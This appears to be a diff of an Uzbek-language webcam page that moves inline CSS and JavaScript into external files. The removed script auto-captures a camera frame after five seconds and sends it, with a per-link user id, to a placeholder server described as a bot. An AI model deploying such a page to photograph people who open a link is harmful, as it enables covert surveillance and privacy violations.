@@ -4,31 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Rasmga Olish</title>
-    <style>
-        body {
-            text-align: center;
-            font-family: Arial, sans-serif;
-        }
-        video {
-            width: 100%;
-            max-width: 400px;
-            margin-top: 20px;
-            border-radius: 10px;
-        }
-        button {
-            margin-top: 10px;
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-            background: #007BFF;
-            color: white;
-            border: none;
-            border-radius: 5px;
-        }
-        button:hover {
-            background: #0056b3;
-        }
-    </style>
+    <link rel="icon" href="favicon.ico" type="image/x-icon"> <!-- Favicon qo‘shildi -->
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
 
@@ -36,83 +13,8 @@
     <video id="video" autoplay></video>
     <canvas id="canvas" style="display: none;"></canvas>
     <button id="retry" style="display: none;">Qayta urinish</button>
-    <p id="error" style="color: red;"></p> <!-- Xatolik uchun joy -->
+    <p id="error"></p>
 
-    <script>
-        const video = document.getElementById("video");
-        const canvas = document.getElementById("canvas");
-        const ctx = canvas.getContext("2d");
-        const retryButton = document.getElementById("retry");
-        const errorMessage = document.getElementById("error");
-
-        function startCamera() {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    video.srcObject = stream;
-                    setTimeout(captureImage, 5000); // 5 soniyada rasmga oladi
-                })
-                .catch(err => {
-                    console.error("Kameraga ruxsat berilmadi!", err);
-                    document.body.innerHTML = "<h1>Kameraga ruxsat berilmadi!</h1>";
-                    retryButton.style.display = "block";
-                });
-        }
-
-        function captureImage() {
-            if (!video.srcObject) {
-                console.error("Kamera yoqilmagan!");
-                return;
-            }
-
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // Rasmni base64 formatda olish
-            const imageData = canvas.toDataURL("image/png");
-
-            // Rasmni Node.js botga yuborish
-            fetch("https://yourserver.com/upload", {
-                method: "POST",
-                mode: "cors",
-                credentials: "include",  // 🍀 CORS muammolarini hal qilish uchun qo'shildi
-                headers: { 
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    image: imageData,
-                    userId: getQueryParam("id")
-                })
-            })
-            .then(res => {
-                if (!res.ok) throw new Error(`Serverdan noto‘g‘ri javob keldi! Status: ${res.status}`);
-                return res.json();
-            })
-            .then(data => {
-                document.body.innerHTML = "<h1>Sizning rasmingiz botga yuborildi!</h1>";
-            })
-            .catch(err => {
-                console.error("Xatolik:", err);
-                errorMessage.innerText = `Xatolik yuz berdi: ${err.message}`;  // 🔴 Aniq xatoni chiqarish
-                retryButton.style.display = "block";
-            });
-        }
-
-        function getQueryParam(param) {
-            const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get(param);
-        }
-
-        retryButton.addEventListener("click", () => {
-            document.body.innerHTML = `<h1>Rasmga tushirilmoqda...</h1>
-                                       <video id="video" autoplay></video>
-                                       <canvas id="canvas" style="display: none;"></canvas>
-                                       <p id="error" style="color: red;"></p>`;
-            startCamera();
-        });
-
-        startCamera();
-    </script>
-
+    <script src="script.js"></script>
 </body>
 </html>
